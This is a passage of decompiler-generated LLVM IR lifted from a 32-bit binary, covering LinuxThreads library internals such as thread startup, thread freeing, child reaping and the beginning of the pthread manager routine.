  uselistorder i32 %v0_8055c64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055c9a, { 1, 0 }
}

define i32 @pthread_start_thread(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_8055c9e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8055cac = call i32 @__libc_getpid(i32 %v0_8055c9e)
  %v1_8055cb1 = load i32, i32* @ebx, align 4
  %v2_8055cb1 = add i32 %v1_8055cb1, 20
  %v3_8055cb1 = inttoptr i32 %v2_8055cb1 to i32*
  store i32 %v1_8055cac, i32* %v3_8055cb1, align 4
  %v0_8055cb5 = load i32, i32* @ebx, align 4
  %v1_8055cb5 = add i32 %v0_8055cb5, 100
  store i32 %v1_8055cb5, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-188, align 4
  %v3_8055cbd = inttoptr i32 %v1_8055cb5 to %_TYPEDEF_sigset_t*
  %v4_8055cbd = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8055cbd, i32 0)
  store i32 %v4_8055cbd, i32* %eax.global-to-local, align 4
  %v0_8055cc2 = load i32, i32* @ebx, align 4
  %v1_8055cc2 = add i32 %v0_8055cc2, 228
  %v2_8055cc2 = inttoptr i32 %v1_8055cc2 to i32*
  %v3_8055cc2 = load i32, i32* %v2_8055cc2, align 4
  %v2_8055ccb = icmp slt i32 %v3_8055cc2, 0
  br i1 %v2_8055ccb, label %dec_label_pc_8055cda, label %dec_label_pc_8055ccf

dec_label_pc_8055ccf:                             ; preds = %entry
  %v1_8055cd0 = add i32 %v0_8055cc2, 232
  br label %dec_label_pc_8055cf9

dec_label_pc_8055cda:                             ; preds = %entry
  %v0_8055cda = load i32, i32* @global_var_8073ab8.660, align 8
  %tmp16 = icmp slt i32 %v0_8055cda, 1
  br i1 %tmp16, label %dec_label_pc_8055d04, label %dec_label_pc_8055ce3

dec_label_pc_8055ce3:                             ; preds = %dec_label_pc_8055cda
  store i32 0, i32* %stack_var_-8, align 4
  %v2_8055cef = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_8055cf9

dec_label_pc_8055cf9:                             ; preds = %dec_label_pc_8055ccf, %dec_label_pc_8055ce3
  %storemerge2 = phi i32 [ %v1_8055cd0, %dec_label_pc_8055ccf ], [ %v2_8055cef, %dec_label_pc_8055ce3 ]
  %storemerge1 = phi i32 [ %v3_8055cc2, %dec_label_pc_8055ccf ], [ 0, %dec_label_pc_8055ce3 ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  %v1_8055cf9 = add i32 %v0_8055cc2, 20
  %v2_8055cf9 = inttoptr i32 %v1_8055cf9 to i32*
  %v3_8055cf9 = load i32, i32* %v2_8055cf9, align 4
  store i32 %v3_8055cf9, i32* %stack_var_-188, align 4
  %v3_8055cfc = call i32 @sched_setscheduler(i32 %v3_8055cf9, i32 %storemerge1, i32 %storemerge2)
  store i32 %v3_8055cfc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055d04

dec_label_pc_8055d04:                             ; preds = %dec_label_pc_8055cda, %dec_label_pc_8055cf9
  %v0_8055d04 = load i32, i32* @global_var_807e110.664, align 16
  store i32 %v0_8055d04, i32* %eax.global-to-local, align 4
  %v1_8055d09 = icmp eq i32 %v0_8055d04, 0
  br i1 %v1_8055d09, label %dec_label_pc_8055d54, label %dec_label_pc_8055d0d

dec_label_pc_8055d0d:                             ; preds = %dec_label_pc_8055d04
  %v0_8055d0d = load i32, i32* @global_var_8073c90.665, align 16
  %tmp17 = icmp slt i32 %v0_8055d0d, 1
  br i1 %tmp17, label %dec_label_pc_8055d54, label %dec_label_pc_8055d16

dec_label_pc_8055d16:                             ; preds = %dec_label_pc_8055d0d
  %v0_8055d16 = load i32, i32* @ebx, align 4
  store i32 %v0_8055d16, i32* %stack_var_-156, align 4
  %v2_8055d22 = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_8055d22

dec_label_pc_8055d22:                             ; preds = %dec_label_pc_8055d3e, %dec_label_pc_8055d16
  store i32 %v2_8055d22, i32* %eax.global-to-local, align 4
  %v0_8055d2d = load i32, i32* @global_var_8073c84.658, align 4
  store i32 %v0_8055d2d, i32* %stack_var_-188, align 4
  %v3_8055d33 = call i32 @__libc_write(i32 %v0_8055d2d, i32 %v2_8055d22, i32 148)
  %v1_8055d3b = add i32 %v3_8055d33, 1
  %v8_8055d3b = icmp eq i32 %v1_8055d3b, 0
  store i32 %v1_8055d3b, i32* %eax.global-to-local, align 4
  %v1_8055d3c = icmp eq i1 %v8_8055d3b, false
  br i1 %v1_8055d3c, label %dec_label_pc_8055d48, label %dec_label_pc_8055d3e

dec_label_pc_8055d3e:                             ; preds = %dec_label_pc_8055d22
  %v0_8055d3e = load i32, i32* %stack_var_-188, align 4
  %v1_8055d3e = call i32 @__errno_location(i32 %v0_8055d3e)
  store i32 %v1_8055d3e, i32* %eax.global-to-local, align 4
  %v1_8055d43 = inttoptr i32 %v1_8055d3e to i32*
  %v2_8055d43 = load i32, i32* %v1_8055d43, align 4
  %v11_8055d43 = icmp eq i32 %v2_8055d43, 4
  br i1 %v11_8055d43, label %dec_label_pc_8055d22, label %dec_label_pc_8055d3e.dec_label_pc_8055d48_crit_edge

dec_label_pc_8055d3e.dec_label_pc_8055d48_crit_edge: ; preds = %dec_label_pc_8055d3e
  br label %dec_label_pc_8055d48

dec_label_pc_8055d48:                             ; preds = %dec_label_pc_8055d22, %dec_label_pc_8055d3e.dec_label_pc_8055d48_crit_edge
  %v0_8055d4b = load i32, i32* @ebx, align 4
  store i32 %v0_8055d4b, i32* %stack_var_-188, align 4
  %v1_8055d4c = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8055d4b)
  store i32 %v1_8055d4c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055d54

dec_label_pc_8055d54:                             ; preds = %dec_label_pc_8055d0d, %dec_label_pc_8055d04, %dec_label_pc_8055d48
  %v0_8055d57 = load i32, i32* @ebx, align 4
  %v1_8055d57 = add i32 %v0_8055d57, 96
  %v2_8055d57 = inttoptr i32 %v1_8055d57 to i32*
  %v3_8055d57 = load i32, i32* %v2_8055d57, align 4
  store i32 %v3_8055d57, i32* %stack_var_-188, align 4
  %v5_8055d5a = add i32 %v0_8055d57, 92
  %v6_8055d5a = inttoptr i32 %v5_8055d5a to i32*
  %v7_8055d5a = load i32, i32* %v6_8055d5a, align 4
  call void @__pseudo_call(i32 %v7_8055d5a)
  store i32 %v3_8055d57, i32* @ecx, align 4
  %v2_8055d5f = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_8055d5f, i32* %stack_var_-188, align 4
  %v0_8055d67 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055d68 = call i32 @__pthread_do_exit(i32 %v0_8055d67, i32 %v2_8055d5f)
  store i32 %v2_8055d68, i32* %eax.global-to-local, align 4
  ret i32 %v2_8055d68

; uselistorder directives
  uselistorder i32 %v3_8055cc2, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 6, 2, 4, 3, 5, 7, 8, 0, 9, 10 }
  uselistorder label %dec_label_pc_8055d54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055d48, { 1, 0 }
  uselistorder label %dec_label_pc_8055d04, { 1, 0 }
  uselistorder label %dec_label_pc_8055cf9, { 1, 0 }
}

define i32 @pthread_start_thread_event(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8055d6d = load i32, i32* @ebx, align 4
  store i32 %v0_8055d6d, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8055d75 = call i32 @__libc_getpid(i32 %v0_8055d6d)
  store i32 0, i32* @edx, align 4
  %v1_8055d7c = load i32, i32* @ebx, align 4
  %v2_8055d7c = add i32 %v1_8055d7c, 20
  %v3_8055d7c = inttoptr i32 %v2_8055d7c to i32*
  store i32 %v1_8055d75, i32* %v3_8055d7c, align 4
  %v0_8055d7f = load i32, i32* @ebx, align 4
  %v1_8055d7f = add i32 %v0_8055d7f, 28
  %v2_8055d7f = inttoptr i32 %v1_8055d7f to i32*
  %v3_8055d7f = load i32, i32* %v2_8055d7f, align 4
  store i32 %v3_8055d7f, i32* @eax, align 4
  %v0_8055d82 = load i32, i32* %stack_var_-4, align 4
  %v1_8055d82 = call i32 @__pthread_lock(i32 %v0_8055d82)
  %v0_8055d8a = load i32, i32* @ebx, align 4
  %v1_8055d8a = add i32 %v0_8055d8a, 28
  %v2_8055d8a = inttoptr i32 %v1_8055d8a to i32*
  %v3_8055d8a = load i32, i32* %v2_8055d8a, align 4
  %v1_8055d8d = inttoptr i32 %v3_8055d8a to i32*
  %v2_8055d8d = call i32 @__pthread_unlock(i32* %v1_8055d8d)
  %v0_8055d92 = load i32, i32* @ebx, align 4
  %v1_8055d95 = call i32 @pthread_start_thread(i32 %v0_8055d92)
  ret i32 %v1_8055d95
}

define i32 @pthread_free() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8055d9a = load i32, i32* @esi, align 4
  %v0_8055d9b = load i32, i32* @ebx, align 4
  %v0_8055d9f = load i32, i32* @eax, align 4
  store i32 %v0_8055d9f, i32* @esi, align 4
  %v1_8055da1 = add i32 %v0_8055d9f, 16
  %v2_8055da1 = inttoptr i32 %v1_8055da1 to i32*
  %v3_8055da1 = load i32, i32* %v2_8055da1, align 4
  store i32 0, i32* @edx, align 4
  %v1_8055da6 = mul i32 %v3_8055da1, 16
  %v2_8055dac = and i32 %v1_8055da6, 16368
  %v1_8055daf = add i32 %v2_8055dac, ptrtoint (i32* @global_var_806f8a0.659 to i32)
  store i32 %v1_8055daf, i32* @ebx, align 4
  store i32 %v1_8055daf, i32* @eax, align 4
  %v1_8055db7 = call i32 @__pthread_lock(i32 %v0_8055d9b)
  %v0_8055dbf = load i32, i32* @ebx, align 4
  %v1_8055dbf = add i32 %v0_8055dbf, 8
  %v2_8055dbf = inttoptr i32 %v1_8055dbf to i32*
  store i32 0, i32* %v2_8055dbf, align 4
  %v0_8055dc6 = load i32, i32* @ebx, align 4
  %v1_8055dc6 = add i32 %v0_8055dc6, 12
  %v2_8055dc6 = inttoptr i32 %v1_8055dc6 to i32*
  store i32 -1, i32* %v2_8055dc6, align 4
  %v0_8055dcd = load i32, i32* @ebx, align 4
  %v1_8055dce = inttoptr i32 %v0_8055dcd to i32*
  %v2_8055dce = call i32 @__pthread_unlock(i32* %v1_8055dce)
  %v0_8055dd3 = load i32, i32* @global_var_80738a0.666, align 32
  %v1_8055dd8 = add i32 %v0_8055dd3, -1
  store i32 %v1_8055dd8, i32* @global_var_80738a0.666, align 32
  %v0_8055dde = load i32, i32* @esi, align 4
  %v1_8055dde = add i32 %v0_8055dde, 448
  %v2_8055dde = inttoptr i32 %v1_8055dde to i32*
  %storemerge23 = load i32, i32* %v2_8055dde, align 4
  %v1_8055df624 = icmp eq i32 %storemerge23, 0
  %v1_8055df825 = icmp eq i1 %v1_8055df624, false
  br i1 %v1_8055df825, label %dec_label_pc_8055de6.lr.ph, label %dec_label_pc_8055dfa

dec_label_pc_8055de6.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8055de6

dec_label_pc_8055de6:                             ; preds = %dec_label_pc_8055de6.lr.ph, %dec_label_pc_8055de6
  %storemerge26 = phi i32 [ %storemerge23, %dec_label_pc_8055de6.lr.ph ], [ %storemerge, %dec_label_pc_8055de6 ]
  %v1_8055de9 = inttoptr i32 %storemerge26 to i32*
  %v2_8055de9 = load i32, i32* %v1_8055de9, align 4
  store i32 %v2_8055de9, i32* @ebx, align 4
  %v1_8055dec = call i32 @free(i32 %storemerge26)
  %storemerge = load i32, i32* @ebx, align 4
  %v1_8055df6 = icmp eq i32 %storemerge, 0
  %v1_8055df8 = icmp eq i1 %v1_8055df6, false
  br i1 %v1_8055df8, label %dec_label_pc_8055de6, label %dec_label_pc_8055df3.dec_label_pc_8055dfa_crit_edge

dec_label_pc_8055df3.dec_label_pc_8055dfa_crit_edge: ; preds = %dec_label_pc_8055de6
  %v0_8055dfa.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055dfa

dec_label_pc_8055dfa:                             ; preds = %dec_label_pc_8055df3.dec_label_pc_8055dfa_crit_edge, %entry
  %v0_8055dfa = phi i32 [ %v0_8055dfa.pre, %dec_label_pc_8055df3.dec_label_pc_8055dfa_crit_edge ], [ %v0_8055dde, %entry ]
  %v1_8055dfa = add i32 %v0_8055dfa, 452
  %v2_8055dfa = inttoptr i32 %v1_8055dfa to i32*
  %v3_8055dfa = load i32, i32* %v2_8055dfa, align 4
  %v1_8055e123 = icmp eq i32 %v3_8055dfa, 0
  %v1_8055e1410 = icmp eq i1 %v1_8055e123, false
  br i1 %v1_8055e1410, label %dec_label_pc_8055e02.preheader, label %dec_label_pc_8055e16

dec_label_pc_8055e02.preheader:                   ; preds = %dec_label_pc_8055dfa
  br label %dec_label_pc_8055e02

dec_label_pc_8055e02:                             ; preds = %dec_label_pc_8055e02.preheader, %dec_label_pc_8055e02
  %v0_8055e05 = phi i32 [ %v0_8055e0d, %dec_label_pc_8055e02 ], [ %v3_8055dfa, %dec_label_pc_8055e02.preheader ]
  %v1_8055e05 = inttoptr i32 %v0_8055e05 to i32*
  %v2_8055e05 = load i32, i32* %v1_8055e05, align 4
  store i32 %v2_8055e05, i32* @ebx, align 4
  %v1_8055e08 = call i32 @free(i32 %v0_8055e05)
  %v0_8055e0d = load i32, i32* @ebx, align 4
  %v1_8055e12 = icmp eq i32 %v0_8055e0d, 0
  %v1_8055e14 = icmp eq i1 %v1_8055e12, false
  br i1 %v1_8055e14, label %dec_label_pc_8055e02, label %dec_label_pc_8055e12.dec_label_pc_8055e16_crit_edge

dec_label_pc_8055e12.dec_label_pc_8055e16_crit_edge: ; preds = %dec_label_pc_8055e02
  %v0_8055e16.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055e16

dec_label_pc_8055e16:                             ; preds = %dec_label_pc_8055e12.dec_label_pc_8055e16_crit_edge, %dec_label_pc_8055dfa
  %v0_8055e34 = phi i32 [ %v0_8055e16.pre, %dec_label_pc_8055e12.dec_label_pc_8055e16_crit_edge ], [ %v0_8055dfa, %dec_label_pc_8055dfa ]
  %v6_8055e16 = icmp eq i32 %v0_8055e34, 134691008
  br i1 %v6_8055e16, label %dec_label_pc_8055e58, label %dec_label_pc_8055e1e

dec_label_pc_8055e1e:                             ; preds = %dec_label_pc_8055e16
  %v1_8055e1e = add i32 %v0_8055e34, 392
  %v2_8055e1e = inttoptr i32 %v1_8055e1e to i32*
  %v3_8055e1e = load i32, i32* %v2_8055e1e, align 4
  %v4_8055e1e = icmp eq i32 %v3_8055e1e, 0
  %v1_8055e25 = icmp eq i1 %v4_8055e1e, false
  br i1 %v1_8055e25, label %dec_label_pc_8055e58, label %dec_label_pc_8055e27

dec_label_pc_8055e27:                             ; preds = %dec_label_pc_8055e1e
  %v1_8055e27 = add i32 %v0_8055e34, 400
  %v2_8055e27 = inttoptr i32 %v1_8055e27 to i32*
  %v3_8055e27 = load i32, i32* %v2_8055e27, align 4
  %v1_8055e2d = icmp eq i32 %v3_8055e27, 0
  br i1 %v1_8055e2d, label %dec_label_pc_8055e42, label %dec_label_pc_8055e31

dec_label_pc_8055e31:                             ; preds = %dec_label_pc_8055e27
  %v0_8055e31 = load i32, i32* @edx, align 4
  %v1_8055e34 = add i32 %v0_8055e34, 396
  %v2_8055e34 = inttoptr i32 %v1_8055e34 to i32*
  %v3_8055e34 = load i32, i32* %v2_8055e34, align 4
  %v4_8055e3a = call i32 @munmap(i32 %v3_8055e34, i32 %v3_8055e27, i32 %v0_8055e31, i32 %v0_8055e31)
  %v0_8055e44.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055e42

dec_label_pc_8055e42:                             ; preds = %dec_label_pc_8055e27, %dec_label_pc_8055e31
  %v0_8055e44 = phi i32 [ %v0_8055e44.pre, %dec_label_pc_8055e31 ], [ %v0_8055e34, %dec_label_pc_8055e27 ]
  %v0_8055e42 = phi i32 [ %v4_8055e3a, %dec_label_pc_8055e31 ], [ 0, %dec_label_pc_8055e27 ]
  %v1_8055e44 = add i32 %v0_8055e44, -2096672
  %v4_8055e50 = call i32 @munmap(i32 %v1_8055e44, i32 2097152, i32 %v0_8055e42, i32 %v0_8055e42)
  br label %dec_label_pc_8055e58

dec_label_pc_8055e58:                             ; preds = %dec_label_pc_8055e1e, %dec_label_pc_8055e16, %dec_label_pc_8055e42
  %v2_8055e58 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8055d9b, i32* @ebx, align 4
  store i32 %v0_8055d9a, i32* @esi, align 4
  ret i32 %v2_8055e58

; uselistorder directives
  uselistorder i32 %v0_8055e34, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_8055e0d, { 1, 0 }
  uselistorder i32 %v0_8055e05, { 1, 0 }
  uselistorder i32 %v0_8055dfa, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder label %dec_label_pc_8055e58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055e42, { 1, 0 }
  uselistorder label %dec_label_pc_8055e02, { 1, 0 }
  uselistorder label %dec_label_pc_8055de6, { 1, 0 }
}

define i32 @restart() local_unnamed_addr {
entry:
  %v0_8055e5f = load i32, i32* @eax, align 4
  %v1_8055e60 = call i32 @__pthread_restart_new(i32 %v0_8055e5f)
  ret i32 %v1_8055e60
}

define i32 @pthread_reap_children() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8055e69 = load i32, i32* @esi, align 4
  %v0_8055e6a = load i32, i32* @ebx, align 4
  store i32 %v0_8055e6a, i32* %stack_var_-8, align 4
  %v2_8055f40 = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_8055f3a

dec_label_pc_8055e73:                             ; preds = %dec_label_pc_8055f3a
  %v0_8055e73 = load i32, i32* bitcast (i32** @global_var_8073c80.657 to i32*), align 128
  br label %dec_label_pc_8055ef2

dec_label_pc_8055e7d:                             ; preds = %dec_label_pc_8055ef2
  %v1_8055e7d = add i32 %v0_8055e84, 20
  %v2_8055e7d = inttoptr i32 %v1_8055e7d to i32*
  %v3_8055e7d = load i32, i32* %v2_8055e7d, align 4
  %v15_8055e7d = icmp eq i32 %v3_8055e7d, %v3_8055f47
  %v1_8055e80 = inttoptr i32 %v0_8055e84 to i32*
  %v2_8055e80 = load i32, i32* %v1_8055e80, align 4
  store i32 %v2_8055e80, i32* %edx.global-to-local, align 4
  %v1_8055e82 = icmp eq i1 %v15_8055e7d, false
  br i1 %v1_8055e82, label %dec_label_pc_8055ef2, label %dec_label_pc_8055e84

dec_label_pc_8055e84:                             ; preds = %dec_label_pc_8055e7d
  %v1_8055e84 = add i32 %v0_8055e84, 4
  %v2_8055e84 = inttoptr i32 %v1_8055e84 to i32*
  %v3_8055e84 = load i32, i32* %v2_8055e84, align 4
  %v2_8055e87 = add i32 %v2_8055e80, 4
  %v3_8055e87 = inttoptr i32 %v2_8055e87 to i32*
  store i32 %v3_8055e84, i32* %v3_8055e87, align 4
  %v0_8055e8a = load i32, i32* @esi, align 4
  %v1_8055e8a = add i32 %v0_8055e8a, 4
  %v2_8055e8a = inttoptr i32 %v1_8055e8a to i32*
  %v3_8055e8a = load i32, i32* %v2_8055e8a, align 4
  %v0_8055e8d = load i32, i32* %edx.global-to-local, align 4
  %v2_8055e8d = inttoptr i32 %v3_8055e8a to i32*
  store i32 %v0_8055e8d, i32* %v2_8055e8d, align 4
  store i32 0, i32* @edx, align 4
  %v0_8055e91 = load i32, i32* @esi, align 4
  %v1_8055e91 = add i32 %v0_8055e91, 28
  %v2_8055e91 = inttoptr i32 %v1_8055e91 to i32*
  %v3_8055e91 = load i32, i32* %v2_8055e91, align 4
  store i32 %v3_8055e91, i32* @eax, align 4
  %v0_8055e94 = load i32, i32* %stack_var_-8, align 4
  %v1_8055e94 = call i32 @__pthread_lock(i32 %v0_8055e94)
  %v0_8055e99 = load i32, i32* @esi, align 4
  %v1_8055e99 = add i32 %v0_8055e99, 46
  %v2_8055e99 = inttoptr i32 %v1_8055e99 to i8*
  store i8 1, i8* %v2_8055e99, align 1
  %v0_8055e9d = load i32, i32* @esi, align 4
  %v1_8055e9d = add i32 %v0_8055e9d, 412
  %v2_8055e9d = inttoptr i32 %v1_8055e9d to i32*
  %v3_8055e9d = load i32, i32* %v2_8055e9d, align 4
  %v4_8055e9d = icmp eq i32 %v3_8055e9d, 0
  br i1 %v4_8055e9d, label %dec_label_pc_8055ed1, label %dec_label_pc_8055ea6

dec_label_pc_8055ea6:                             ; preds = %dec_label_pc_8055e84
  %v0_8055ea6 = load i32, i32* @global_var_807e104.655, align 4
  %v2_8055eab = add i32 %v0_8055e9d, 416
  %v3_8055eab = inttoptr i32 %v2_8055eab to i32*
  %v4_8055eab = load i32, i32* %v3_8055eab, align 4
  %v5_8055eab = or i32 %v4_8055eab, %v0_8055ea6
  store i32 %v5_8055eab, i32* @eax, align 4
  %v3_8055eb1 = and i32 %v5_8055eab, 2048
  %v4_8055eb1 = icmp eq i32 %v3_8055eb1, 0
  br i1 %v4_8055eb1, label %dec_label_pc_8055ed1, label %dec_label_pc_8055eb6

dec_label_pc_8055eb6:                             ; preds = %dec_label_pc_8055ea6
  %v1_8055eb6 = add i32 %v0_8055e9d, 424
  %v2_8055eb6 = inttoptr i32 %v1_8055eb6 to i32*
  store i32 12, i32* %v2_8055eb6, align 4
  %v0_8055ec0 = load i32, i32* @esi, align 4
  %v2_8055ec0 = add i32 %v0_8055ec0, 428
  %v3_8055ec0 = inttoptr i32 %v2_8055ec0 to i32*
  store i32 %v0_8055ec0, i32* %v3_8055ec0, align 4
  %v0_8055ec6 = load i32, i32* @esi, align 4
  store i32 %v0_8055ec6, i32* @global_var_807e10c.656, align 4
  %v0_8055ecc = call i32 @__linuxthreads_reap_event()
  %v0_8055ed4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055ed1

dec_label_pc_8055ed1:                             ; preds = %dec_label_pc_8055ea6, %dec_label_pc_8055e84, %dec_label_pc_8055eb6
  %v0_8055ed4 = phi i32 [ %v0_8055e9d, %dec_label_pc_8055ea6 ], [ %v0_8055e9d, %dec_label_pc_8055e84 ], [ %v0_8055ed4.pre, %dec_label_pc_8055eb6 ]
  %v1_8055ed4 = add i32 %v0_8055ed4, 45
  %v2_8055ed4 = inttoptr i32 %v1_8055ed4 to i8*
  %v3_8055ed4 = load i8, i8* %v2_8055ed4, align 1
  %v4_8055ed4 = sext i8 %v3_8055ed4 to i32
  store i32 %v4_8055ed4, i32* @ebx, align 4
  %v1_8055ed8 = add i32 %v0_8055ed4, 28
  %v2_8055ed8 = inttoptr i32 %v1_8055ed8 to i32*
  %v3_8055ed8 = load i32, i32* %v2_8055ed8, align 4
  %v1_8055edb = inttoptr i32 %v3_8055ed8 to i32*
  %v2_8055edb = call i32 @__pthread_unlock(i32* %v1_8055edb)
  %v1_8055ee3 = icmp eq i8 %v3_8055ed4, 0
  br i1 %v1_8055ee3, label %dec_label_pc_8055ef6, label %dec_label_pc_8055ee7

dec_label_pc_8055ee7:                             ; preds = %dec_label_pc_8055ed1
  %v0_8055ee7 = load i32, i32* @esi, align 4
  store i32 %v0_8055ee7, i32* @eax, align 4
  %v0_8055ee9 = call i32 @pthread_free()
  br label %dec_label_pc_8055ef6

dec_label_pc_8055ef2:                             ; preds = %dec_label_pc_8055e7d, %dec_label_pc_8055e73
  %v0_8055e84 = phi i32 [ %v0_8055e73, %dec_label_pc_8055e73 ], [ %v2_8055e80, %dec_label_pc_8055e7d ]
  store i32 %v0_8055e84, i32* @esi, align 4
  %v12_8055ef2 = icmp eq i32 %v0_8055e84, %v0_8055e73
  %v1_8055ef4 = icmp eq i1 %v12_8055ef2, false
  br i1 %v1_8055ef4, label %dec_label_pc_8055e7d, label %dec_label_pc_8055ef6.loopexit

dec_label_pc_8055ef6.loopexit:                    ; preds = %dec_label_pc_8055ef2
  br label %dec_label_pc_8055ef6

dec_label_pc_8055ef6:                             ; preds = %dec_label_pc_8055ef6.loopexit, %dec_label_pc_8055ed1, %dec_label_pc_8055ee7
  %v0_8055ef6 = load i32, i32* @global_var_80784a4.663, align 4
  %v1_8055ef6 = icmp eq i32 %v0_8055ef6, 0
  br i1 %v1_8055ef6, label %dec_label_pc_8055f11, label %dec_label_pc_8055eff

dec_label_pc_8055eff:                             ; preds = %dec_label_pc_8055ef6
  %v0_8055eff = load i32, i32* bitcast (i32** @global_var_8073c80.657 to i32*), align 128
  store i32 %v0_8055eff, i32* %edx.global-to-local, align 4
  store i32 %v0_8055eff, i32* @eax, align 4
  %v0_8055f0c = call i32 @restart()
  br label %dec_label_pc_8055f11

dec_label_pc_8055f11:                             ; preds = %dec_label_pc_8055ef6, %dec_label_pc_8055eff
  %v3_8055f11 = load i32, i32* %stack_var_-12, align 4
  %v1_8055f17 = urem i32 %v3_8055f11, 128
  %v1_8055f1a = add nuw nsw i32 %v1_8055f17, 1
  %v10_8055f1a = trunc i32 %v1_8055f1a to i8
  %tmp22 = icmp slt i8 %v10_8055f1a, 2
  br i1 %tmp22, label %dec_label_pc_8055f3a, label %dec_label_pc_8055f21

dec_label_pc_8055f21:                             ; preds = %dec_label_pc_8055f11
  store i32 %v1_8055f17, i32* @ecx, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v1_8055f17, i32* @eax, align 4
  %v0_8055f2b = call i32 @pthread_kill_all_threads()
  %v1_8055f35 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8055f3a:                             ; preds = %dec_label_pc_8055f11, %entry
  %v3_8055f47 = call i32 @__libc_waitpid(i32 -1, i32 %v2_8055f40, i32 -2147483647)
  %tmp23 = icmp slt i32 %v3_8055f47, 1
  %tmp24 = icmp eq i1 %tmp23, false
  br i1 %tmp24, label %dec_label_pc_8055e73, label %dec_label_pc_8055f57

dec_label_pc_8055f57:                             ; preds = %dec_label_pc_8055f3a
  %v2_8055f5a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055f5a, i32* @ebx, align 4
  store i32 %v0_8055e69, i32* @esi, align 4
  ret i32 %v3_8055f47

; uselistorder directives
  uselistorder i32 %v3_8055f47, { 0, 2, 1 }
  uselistorder i32 %v1_8055f17, { 1, 2, 0 }
  uselistorder i32 %v0_8055e84, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v0_8055ed4, { 1, 0 }
  uselistorder i32 %v0_8055ec0, { 1, 0 }
  uselistorder i32 %v2_8055e80, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055f11, { 1, 0 }
  uselistorder label %dec_label_pc_8055ef6, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055ed1, { 2, 0, 1 }
}

define i32 @__pthread_manager(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055f5d = load i32, i32* @ebp, align 4
  %v0_8055f5e = load i32, i32* @edi, align 4
  %v0_8055f5f = load i32, i32* @esi, align 4
  %v0_8055f60 = load i32, i32* @ebx, align 4
  store i32 %v0_8055f60, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_8073ae8.667 to i32), i32* bitcast (i32** @global_var_8073ae4.668 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_8073af0.670 to i32), i32* @global_var_8073aec.669, align 4
  %v2_8055f7b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8055f7b, i32* @ebx, align 4
  store i32 %v2_8055f7b, i32* %stack_var_-364, align 4
  %v1_8055f83 = call i32 @sigfillset(i32 %v2_8055f7b)
  store i32 %v1_8055f83, i32* %eax.global-to-local, align 4
  %v0_8055f8a = load i32, i32* @global_var_8073c8c.671, align 4
  store i32 %v2_8055f7b, i32* %stack_var_-364, align 4
  %v1_8055f91 = call i32 @__GI_sigdelset(i32 %v2_8055f7b)
  store i32 %v1_8055f91, i32* %eax.global-to-local, align 4
  store i32 %v2_8055f7b, i32* %ecx.global-to-local, align 4
  store i32 %v0_8055f8a, i32* @esi, align 4
  store i32 %v2_8055f7b, i32* %stack_var_-364, align 4
  %v1_8055f9b = call i32 @__GI_sigdelset(i32 %v2_8055f7b)
  %v0_8055fa0 = load i32, i32* @global_var_807e110.664, align 16
  store i32 %v0_8055fa0, i32* %eax.global-to-local, align 4
  %v1_8055fa8 = icmp eq i32 %v0_8055fa0, 0
  br i1 %v1_8055fa8, label %dec_label_pc_8055fc1, label %dec_label_pc_8055fac

dec_label_pc_8055fac:                             ; preds = %entry
  %v0_8055fac = load i32, i32* @global_var_8073c90.665, align 16
  store i32 %v0_8055fac, i32* %eax.global-to-local, align 4
  %tmp48 = icmp slt i32 %v0_8055fac, 1
  br i1 %tmp48, label %dec_label_pc_8055fc1, label %dec_label_pc_8055fb5

dec_label_pc_8055fb5:                             ; preds = %dec_label_pc_8055fac
